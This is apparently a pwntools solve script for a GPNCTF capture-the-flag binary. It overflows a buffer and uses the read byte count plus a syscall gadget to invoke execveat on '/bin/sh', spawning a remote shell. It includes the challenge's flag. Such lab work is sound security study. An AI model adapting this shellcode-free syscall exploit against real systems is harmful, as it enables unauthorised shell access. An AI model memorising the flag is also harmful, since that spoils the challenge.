from pwn import *

elf = context.binary = ELF("./gift")
'''
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable

  int execveat(int dirfd, const char *pathname,
          char *const _Nullable argv[],
          char *const _Nullable envp[],
          int flags);
  
  sysread stores the number of bytes read in rax.
  Our first input makes an ROP chain which calls sysread, followed by calling xor rdx, rdx ; syscall
  Our second input is exactly 322 characters to invoke sys_execveat
'''
if args.REMOTE:
  # fill in remote address
  p = remote("only-time--peter-schilling-6202.ctf.kitctf.de", "443", ssl=True)
elif args.REMOTE2:
  p = remote("localhost", 40003)
elif args.GDB:
  context.terminal = ["tmux", "splitw", "-h"]
  p = gdb.debug(binary, gdbscript=gs)
else:
  p = elf.process()

# allowed to send 330 bytes
# the last 0x10 bytes will overwrite RIP
payload = b'/bin/sh' + b'\x00' + (0x13a - 8) * b'a' # first 0x13a (314) bytes
# Cannot stack pivot since we don't have a leave 
# overwrite RSP
# next 8 bytes (send a total of 322 bytes only)
payload += p64(0x00401059) # xor rdx, rdx ; syscall
p.recvline()
# pause()
p.send(payload)

p.interactive() # GPNCTF{new_stuff_and_constraints_a29kd33}